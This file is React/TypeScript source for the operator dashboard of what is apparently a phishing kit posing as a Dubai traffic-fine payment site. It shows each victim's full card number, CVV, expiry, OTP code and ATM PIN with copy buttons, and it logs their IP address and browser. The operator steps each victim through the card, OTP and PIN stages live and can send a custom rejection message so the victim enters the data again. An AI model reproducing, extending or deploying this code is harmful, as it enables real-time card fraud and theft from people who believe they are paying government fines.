import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

// ======== الألوان والأنماط ========
const stageLabels: Record<Stage, { label: string; color: string; bg: string }> = {
  card: { label: "إدخال البطاقة", color: "#3b82f6", bg: "#eff6ff" },
  card_pending: { label: "انتظار موافقة البطاقة", color: "#f59e0b", bg: "#fffbeb" },
  otp: { label: "إدخال OTP", color: "#8b5cf6", bg: "#f5f3ff" },
  otp_pending: { label: "انتظار موافقة OTP", color: "#f59e0b", bg: "#fffbeb" },
  atm: { label: "إدخال PIN", color: "#b45309", bg: "#fef3c7" },
  atm_pending: { label: "انتظار موافقة PIN", color: "#f59e0b", bg: "#fffbeb" },
  success: { label: "تم الدفع", color: "#10b981", bg: "#ecfdf5" },
  failed: { label: "فشل الدفع", color: "#ef4444", bg: "#fef2f2" },
};

function StageBadge({ stage }: { stage: Stage }) {
  const info = stageLabels[stage] || { label: stage, color: "#6b7280", bg: "#f9fafb" };
  return (
    <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-semibold"
      style={{ color: info.color, backgroundColor: info.bg }}>
      {info.label}
    </span>
  );
}

function Notification({ message, type, onClose }: { message: string; type: "success" | "error" | "info"; onClose: () => void }) {
  useEffect(() => {
    const t = setTimeout(onClose, 4000);
    return () => clearTimeout(t);
  }, []);

  const colors = {
    success: "bg-green-500",
    error: "bg-red-500",
    info: "bg-blue-500",
  };

  return (
    <div className={`fixed top-4 left-4 z-50 ${colors[type]} text-white rounded-xl px-4 py-3 shadow-lg flex items-center gap-3 min-w-64`}>
      <span>{type === "success" ? "✅" : type === "error" ? "❌" : "ℹ️"}</span>
      <p className="text-sm">{message}</p>
      <button onClick={onClose} className="mr-auto text-white/80 hover:text-white">✕</button>
    </div>
  );
}

// ======== Modal تفاصيل الجلسة ========
function SessionDetailModal({
  session,
  token,
  onClose,
  onAction,
}: {
  session: PaymentSession;
  token: string;
  onClose: () => void;
  onAction: (action: "pass" | "denied" | "completed", errorMsg?: string) => void;
}) {
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");
  const [copied, setCopied] = useState<string | null>(null);

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text);
      setTimeout(() => setCopied(null), 2000);
    });
  };

  const Row = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2 border-b border-gray-700">
      <span className="text-gray-400 text-sm">{label}</span>
      <span className="text-gray-100 text-sm font-medium">{value || "-"}</span>
    </div>
  );

  const RowCopy = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2 border-b border-gray-700">
      <span className="text-gray-400 text-sm">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-100 text-sm font-mono font-medium">{value || "-"}</span>
        {value && (
          <button onClick={() => copyText(value)}
            className="text-gray-500 hover:text-blue-400 transition p-1 rounded">
            {copied === value ? "✓" : "📋"}
          </button>
        )}
      </div>
    </div>
  );

  const isPending = session.stage.endsWith("_pending");

  return (
    <div className="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div className="bg-[#1e293b] rounded-2xl border border-gray-700 w-full max-w-2xl max-h-[90vh] overflow-y-auto"
        onClick={e => e.stopPropagation()}>
        {/* هيدر */}
        <div className="flex items-center justify-between p-4 border-b border-gray-700">
          <div>
            <h3 className="text-white font-bold">تفاصيل الجلسة</h3>
            <p className="text-gray-400 text-xs font-mono">{session.sessionId}</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white text-xl">✕</button>
        </div>

        <div className="p-4 space-y-4">
          {/* معلومات أساسية */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {/* بيانات اللوحة */}
            <div className="bg-[#0f172a] rounded-xl p-3">
              <h4 className="text-blue-400 text-sm font-bold mb-2">🚗 بيانات اللوحة</h4>
              <Row label="رقم اللوحة" value={session.plateNumber} />
              <Row label="الإمارة" value={session.plateSource} />
              <Row label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} درهم` : null} />
              <Row label="الحالة" value={stageLabels[session.stage]?.label} />
              <Row label="IP العميل" value={session.clientIp} />
            </div>

            {/* بيانات البطاقة */}
            {session.cardNumber && (
              <div className="bg-[#0f172a] rounded-xl p-3">
                <h4 className="text-green-400 text-sm font-bold mb-2">💳 بيانات البطاقة</h4>
                <RowCopy label="اسم الحامل" value={session.cardName} />
                <RowCopy label="رقم البطاقة" value={session.cardNumber} />
                <RowCopy label="تاريخ الانتهاء" value={session.cardExpiry} />
                <RowCopy label="CVV" value={session.cardCvv} />
              </div>
            )}

            {/* OTP */}
            {session.otpCode && (
              <div className="bg-[#0f172a] rounded-xl p-3">
                <h4 className="text-purple-400 text-sm font-bold mb-2">🔐 رمز OTP</h4>
                <RowCopy label="رمز OTP" value={session.otpCode} />
              </div>
            )}

            {/* ATM PIN */}
            {session.atmPin && (
              <div className="bg-[#0f172a] rounded-xl p-3">
                <h4 className="text-amber-400 text-sm font-bold mb-2">🏧 الرقم السري</h4>
                <RowCopy label="PIN" value={session.atmPin} />
              </div>
            )}
          </div>

          {/* الإجراءات */}
          {isPending && (
            <div className="bg-[#0f172a] rounded-xl p-4">
              <h4 className="text-white text-sm font-bold mb-3">⚡ الإجراءات</h4>
              <div className="flex flex-wrap gap-2 mb-3">
                <button onClick={() => onAction("pass")}
                  className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1">
                  ✓ قبول / التالي
                </button>
                <button onClick={() => onAction("denied", customError)}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1">
                  ✕ رفض
                </button>
                <button onClick={() => onAction("completed")}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1">
                  ✓✓ إتمام الدفع
                </button>
              </div>
              <div>
                <label className="text-gray-400 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                <input
                  type="text"
                  value={customError}
                  onChange={e => setCustomError(e.target.value)}
                  className="w-full bg-[#1e293b] border border-gray-600 text-white text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>
          )}

          {/* معلومات إضافية */}
          <div className="bg-[#0f172a] rounded-xl p-3">
            <h4 className="text-gray-400 text-sm font-bold mb-2">📋 معلومات إضافية</h4>
            <Row label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString("ar-AE")} />
            <Row label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString("ar-AE")} />
            <div className="py-2">
              <span className="text-gray-400 text-sm">المتصفح</span>
              <p className="text-gray-300 text-xs mt-1 break-all">{session.userAgent || "-"}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ======== الصفحة الرئيسية للأدمين ========
export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [activeSection, setActiveSection] = useState<"dashboard" | "sessions" | "settings">("dashboard");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);

  // tRPC
  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery(
    { token: token || "" },
    { enabled: !!token, retry: false }
  );
  const statsQuery = trpc.admin.getStats.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 10000 }
  );
  const sessionsQuery = trpc.admin.getSessions.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true && activeSection === "sessions", refetchInterval: 5000 }
  );
  const sessionDetailQuery = trpc.admin.getSession.useQuery(
    { token: token || "", sessionId: selectedSession?.sessionId || "" },
    { enabled: !!token && !!selectedSession, refetchInterval: 3000 }
  );
  const actionMutation = trpc.admin.action.useMutation();

  // التحقق من صحة التوكن
  useEffect(() => {
    if (verifyQuery.data && !verifyQuery.data.valid) {
      localStorage.removeItem("adminToken");
      setToken(null);
    }
  }, [verifyQuery.data]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoginError("");
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError(err.message || "كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!selectedSession || !token) return;
    try {
      const res = await actionMutation.mutateAsync({
        token,
        sessionId: selectedSession.sessionId,
        action,
        errorMessage: errorMsg,
      });
      setNotification({
        message: `تم تنفيذ الإجراء: ${action === "pass" ? "قبول" : action === "denied" ? "رفض" : "إتمام"} → ${res.newStage}`,
        type: "success",
      });
      setSelectedSession(null);
      sessionsQuery.refetch();
      statsQuery.refetch();
    } catch (err: any) {
      setNotification({ message: err.message || "حدث خطأ", type: "error" });
    }
  };

  // ======== صفحة تسجيل الدخول ========
  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4">
        <div className="bg-[#1e293b] border border-gray-700 rounded-2xl p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-3">
              <span className="text-3xl">🛡️</span>
            </div>
            <h2 className="text-white text-xl font-bold">لوحة التحكم</h2>
            <p className="text-gray-400 text-sm mt-1">نظام مخالفات دبي</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4" dir="rtl">
            <div>
              <label className="text-gray-400 text-sm block mb-1">كلمة المرور</label>
              <div className="flex gap-2">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  className="flex-1 bg-[#0f172a] border border-gray-600 text-white rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500"
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)}
                  className="bg-[#0f172a] border border-gray-600 text-gray-400 rounded-xl px-3 hover:text-white transition">
                  {showPassword ? "🙈" : "👁️"}
                </button>
              </div>
            </div>

            {loginError && (
              <div className="bg-red-500/20 border border-red-500/30 rounded-xl px-4 py-2">
                <p className="text-red-400 text-sm">{loginError}</p>
              </div>
            )}

            <button type="submit" disabled={loginMutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition disabled:opacity-60 flex items-center justify-center gap-2">
              {loginMutation.isPending ? (
                <><div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />جاري الدخول...</>
              ) : "🔑 دخول"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const stats = statsQuery.data;
  const sessions = sessionsQuery.data || [];
  const pendingSessions = sessions.filter(s => s.stage.endsWith("_pending"));
  const newCount = sessions.filter(s => s.statusRead === 0).length;

  // ======== لوحة التحكم ========
  return (
    <div className="min-h-screen bg-[#0f172a] text-gray-100 flex" dir="rtl">
      {/* Notification */}
      {notification && (
        <Notification
          message={notification.message}
          type={notification.type}
          onClose={() => setNotification(null)}
        />
      )}

      {/* Modal تفاصيل الجلسة */}
      {selectedSession && token && (
        <SessionDetailModal
          session={sessionDetailQuery.data || selectedSession}
          token={token}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
        />
      )}

      {/* Sidebar */}
      <div className="w-64 min-h-screen bg-[#1e293b] border-l border-gray-700 fixed top-0 right-0 flex flex-col">
        <div className="p-4 border-b border-gray-700">
          <h2 className="text-white font-bold">🚦 لوحة التحكم</h2>
          <p className="text-gray-400 text-xs mt-1">نظام مخالفات دبي</p>
          <div className="mt-2 flex items-center gap-1">
            <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
            <span className="text-green-400 text-xs">متصل</span>
          </div>
        </div>

        <nav className="flex-1 py-3 space-y-1">
          {[
            { id: "dashboard", label: "الرئيسية", icon: "📊" },
            { id: "sessions", label: "الجلسات", icon: "💳", badge: newCount },
            { id: "settings", label: "الإعدادات", icon: "⚙️" },
          ].map(item => (
            <button key={item.id}
              onClick={() => setActiveSection(item.id as any)}
              className={`w-full flex items-center gap-3 px-4 py-2.5 text-sm rounded-lg mx-2 transition
                ${activeSection === item.id ? "bg-gray-700 text-white" : "text-gray-400 hover:bg-gray-700/50 hover:text-white"}`}
              style={{ width: "calc(100% - 16px)" }}>
              <span>{item.icon}</span>
              <span>{item.label}</span>
              {item.badge && item.badge > 0 ? (
                <span className="mr-auto bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">
                  {item.badge}
                </span>
              ) : null}
            </button>
          ))}
        </nav>

        <div className="p-3 border-t border-gray-700">
          <button onClick={handleLogout}
            className="w-full bg-red-500/20 hover:bg-red-500/30 text-red-400 py-2 rounded-lg text-sm font-medium transition">
            🚪 تسجيل الخروج
          </button>
        </div>
      </div>

      {/* المحتوى الرئيسي */}
      <div className="flex-1 mr-64 p-6">
        {/* قسم الرئيسية */}
        {activeSection === "dashboard" && (
          <div>
            <h3 className="text-white text-xl font-bold mb-6">📊 الرئيسية</h3>

            {/* إحصائيات */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
              {[
                { label: "إجمالي الجلسات", value: stats?.total ?? 0, icon: "💳", color: "#3b82f6" },
                { label: "جديد", value: stats?.new ?? 0, icon: "🔔", color: "#ef4444" },
                { label: "انتظار موافقة", value: stats?.pending ?? 0, icon: "⏳", color: "#f59e0b" },
                { label: "مكتمل", value: stats?.completed ?? 0, icon: "✅", color: "#10b981" },
              ].map((stat, i) => (
                <div key={i} className="bg-[#1e293b] border border-gray-700 rounded-xl p-4 text-center">
                  <div className="text-3xl mb-2">{stat.icon}</div>
                  <div className="text-2xl font-bold text-white">{stat.value}</div>
                  <div className="text-gray-400 text-sm">{stat.label}</div>
                </div>
              ))}
            </div>

            {/* الجلسات التي تنتظر موافقة */}
            {pendingSessions.length > 0 && (
              <div className="bg-[#1e293b] border border-amber-500/30 rounded-xl p-4 mb-4">
                <h4 className="text-amber-400 font-bold mb-3 flex items-center gap-2">
                  <span className="animate-pulse">⚠️</span>
                  {pendingSessions.length} جلسة تنتظر موافقتك
                </h4>
                <div className="space-y-2">
                  {pendingSessions.map(s => (
                    <div key={s.sessionId}
                      onClick={() => setSelectedSession(s)}
                      className="flex items-center justify-between bg-[#0f172a] rounded-lg px-4 py-3 cursor-pointer hover:bg-gray-800 transition">
                      <div>
                        <p className="text-white text-sm font-mono">{s.sessionId.slice(0, 12)}...</p>
                        <p className="text-gray-400 text-xs">{s.plateNumber} - {s.totalAmount} درهم</p>
                      </div>
                      <div className="flex items-center gap-2">
                        <StageBadge stage={s.stage} />
                        <span className="text-gray-400">›</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* آخر الجلسات */}
            <div className="bg-[#1e293b] border border-gray-700 rounded-xl p-4">
              <h4 className="text-white font-bold mb-3">آخر الجلسات</h4>
              {sessions.slice(0, 5).length === 0 ? (
                <p className="text-gray-500 text-center py-4">لا توجد جلسات حتى الآن</p>
              ) : (
                sessions.slice(0, 5).map(s => (
                  <div key={s.sessionId}
                    onClick={() => { setSelectedSession(s); setActiveSection("sessions"); }}
                    className="flex items-center justify-between py-2 border-b border-gray-700 last:border-0 cursor-pointer hover:bg-gray-800/50 px-2 rounded transition">
                    <div>
                      <span className="text-white text-sm">{s.plateNumber || "غير محدد"}</span>
                      <span className="text-gray-400 text-xs mr-2">{s.sessionId.slice(0, 8)}...</span>
                    </div>
                    <StageBadge stage={s.stage} />
                  </div>
                ))
              )}
            </div>
          </div>
        )}

        {/* قسم الجلسات */}
        {activeSection === "sessions" && (
          <div>
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-white text-xl font-bold">💳 جلسات الدفع</h3>
              <button onClick={() => sessionsQuery.refetch()}
                className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg text-sm transition flex items-center gap-2">
                🔄 تحديث
              </button>
            </div>

            {sessionsQuery.isLoading ? (
              <div className="text-center py-12 text-gray-400">جاري التحميل...</div>
            ) : sessions.length === 0 ? (
              <div className="text-center py-12 text-gray-500">لا توجد جلسات</div>
            ) : (
              <div className="bg-[#1e293b] border border-gray-700 rounded-xl overflow-hidden">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-gray-700">
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">المعرف</th>
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">اللوحة</th>
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">المبلغ</th>
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">الحالة</th>
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">التاريخ</th>
                      <th className="text-right text-gray-400 text-sm font-medium px-4 py-3">إجراء</th>
                    </tr>
                  </thead>
                  <tbody>
                    {sessions.map(s => (
                      <tr key={s.sessionId}
                        className="border-b border-gray-700 hover:bg-gray-800/50 cursor-pointer transition"
                        onClick={() => setSelectedSession(s)}>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <code className="text-blue-400 text-xs">{s.sessionId.slice(0, 10)}...</code>
                            {s.statusRead === 0 && (
                              <span className="bg-red-500 text-white text-xs px-1.5 py-0.5 rounded-full">جديد</span>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3 text-white text-sm">{s.plateNumber || "-"}</td>
                        <td className="px-4 py-3 text-white text-sm">{s.totalAmount ? `${s.totalAmount} درهم` : "-"}</td>
                        <td className="px-4 py-3"><StageBadge stage={s.stage} /></td>
                        <td className="px-4 py-3 text-gray-400 text-xs">
                          {new Date(s.createdAt).toLocaleString("ar-AE")}
                        </td>
                        <td className="px-4 py-3">
                          <button
                            onClick={e => { e.stopPropagation(); setSelectedSession(s); }}
                            className="text-blue-400 hover:text-blue-300 text-sm">
                            👁️ عرض
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* قسم الإعدادات */}
        {activeSection === "settings" && (
          <div>
            <h3 className="text-white text-xl font-bold mb-6">⚙️ الإعدادات</h3>
            <div className="bg-[#1e293b] border border-gray-700 rounded-xl p-4 max-w-md">
              <h4 className="text-white font-bold mb-3">معلومات النظام</h4>
              <div className="space-y-2">
                <div className="flex justify-between py-2 border-b border-gray-700">
                  <span className="text-gray-400 text-sm">الإصدار</span>
                  <span className="text-white text-sm">1.0.0</span>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-700">
                  <span className="text-gray-400 text-sm">رابط الموقع</span>
                  <a href="/" className="text-blue-400 text-sm hover:underline">{window.location.origin}</a>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-700">
                  <span className="text-gray-400 text-sm">رابط لوحة التحكم</span>
                  <span className="text-white text-sm">{window.location.origin}/admin</span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-gray-400 text-sm">رابط الدفع</span>
                  <span className="text-white text-sm">{window.location.origin}/payment</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
